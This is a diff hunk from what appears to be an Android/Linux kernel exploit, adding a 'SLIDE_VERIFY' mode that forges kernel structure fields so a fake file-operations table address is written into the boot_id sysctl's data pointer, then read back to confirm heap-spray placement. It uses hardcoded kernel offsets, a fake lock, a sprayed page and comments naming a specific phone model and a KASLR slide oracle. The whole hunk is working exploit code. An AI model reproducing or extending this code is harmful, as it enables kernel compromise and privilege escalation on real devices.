@@ -890,6 +890,26 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             stack_deadline = 0;
             pr_info("stack mode4 SLIDE_ZERO: *%016llx = 0\n",
                     (unsigned long long)tree_l);
+          } else if (env_flag("MODE4_SLIDE_VERIFY", 0)) {
+            /*
+             * PLACEMENT VERIFIER: write fake_fops (sprayed page address)
+             * to boot_id ctl_table.data. Then boot_id reads the first 16
+             * bytes AT the fake fops table. If our table is there, we see
+             * owner(0) + llseek JT text ptr. If garbage, placement failed.
+             * Non-destructive: device survives (proven SL2).
+             */
+            tree_pc = (uint64_t)fake_fops;
+            tree_r = 0;
+            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
+            pi_parent = 0;
+            pi_right = 0;
+            pi_left = 0;
+            stack_lock = fake_lock;
+            stack_prio = 3;
+            stack_deadline = 0;
+            pr_info("stack SLIDE_VERIFY: *ctl_table.data = fake_fops "
+                    "(%016llx) — boot_id will dump sprayed page\n",
+                    (unsigned long long)tree_pc);
           } else if (env_flag("MODE4_SLIDE", 0)) {
             /*
              * Aristotle SLIDE oracle (kallsyms-measured for CPH2521):
